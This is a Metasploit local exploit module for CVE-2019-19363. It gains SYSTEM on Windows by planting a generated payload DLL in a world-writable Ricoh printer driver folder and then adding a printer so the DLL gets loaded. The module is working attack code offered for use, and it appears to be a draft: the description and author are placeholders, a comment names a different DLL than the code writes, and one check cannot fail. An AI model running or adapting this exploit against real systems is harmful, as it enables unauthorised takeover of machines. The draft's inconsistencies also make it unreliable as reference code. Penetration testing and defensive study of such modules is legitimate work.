##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(update_info(info,
        'Name'           => 'Ricoh Driver Privilege Escalation',
        'Description'    => %q(
          placeholder description
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
                              'placeholder',  # discovery & poc
                              'Shelby Pace'   # msf module
                            ],
        'References'     =>
          [
            [ 'CVE', '2019-19363'],
            [ 'URL', 'https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/']
          ],
        'Arch'           => [ ARCH_X86, ARCH_X64 ],
        'Platform'       => 'win',
        'Payload'        =>
        {
        },
        'SessionTypes'   => [ 'shell', 'meterpreter' ],
        'Targets'        =>
          [
            [
              'Windows',
              {
              }
            ]
          ],
        'Notes'          =>
        {
          'SideEffects' =>  [ ARTIFACTS_ON_DISK ],
          'Reliability' =>  [],
          'Stability'   =>  [ SERVICE_RESOURCE_LOSS ]
        },
        'DisclosureDate' => "Jan 22 2020",
        'DefaultTarget'  => 0
    ))

    register_advanced_options([
      OptBool.new('ForceExploit', [ false, 'Override check result', false ])
    ])
  end

  def check
    dir_name = "C:\\ProgramData\\RICOH_DRV"

    return CheckCode::Safe('No Ricoh driver directory found') unless directory?(dir_name)
    driver_names = dir(dir_name)

    return CheckCode::Detected("Detected Ricoh driver directory, but no installed drivers") unless driver_names.length

    vulnerable = false
    driver_names.each do |driver_name|
      full_path = "#{dir_name}\\#{driver_name}\\_common\\dlz"
      next unless directory?(full_path)
      @driver_path = full_path

      res = cmd_exec("icacls \"#{@driver_path}\"")
      next unless res.include?('Everyone:')
      next unless res.match(/\(F\)/)

      vulnerable = true
      break
    end

    return CheckCode::Detected('Ricoh driver directory does not have full permissions') unless vulnerable

    vprint_status("Vulnerable driver directory: #{@driver_path}")
    CheckCode::Appears('Ricoh driver directory has full permissions')
  end

  def add_printer(driver_name)
    script_path = "C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\prnmngr.vbs"
    fail_with(Failure::NotFound, 'Printer driver script not found') unless file?(script_path)

    # headerfooter.dll needs to be overwritten since it's the last to load
    dll_data = generate_payload_dll
    dll_path = "#{@driver_path}\\watermark.dll"
    print_status("Writing malicious dll to #{dll_path}")
    write_file(dll_path, dll_data)

    # add the printer
    printer_name = Rex::Text.rand_text_alpha(5..9)
    write_file(dll_path, dll_data)
    script_cmd = "cmd.exe /c start /b cscript \"#{script_path}\" -a -p \"#{printer_name}\" -m \"#{driver_name}\" -r \"lpt1:\""
    printer_res = cmd_exec(script_cmd)
    write_file(dll_path, dll_data)
    print_status(printer_res)
  rescue
    print_bad('Unable to add printer')
  end

  def exploit
    fail_with(Failure::None, 'Already running as SYSTEM') if is_system?

    @driver_path = ''
    unless check == CheckCode::Appears || datastore['ForceExploit']
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override')
    end

    drvr_name = @driver_path.split('\\')
    drvr_name_idx = drvr_name.index('RICOH_DRV') + 1
    drvr_name = drvr_name[drvr_name_idx]
    add_printer(drvr_name)
  end
end
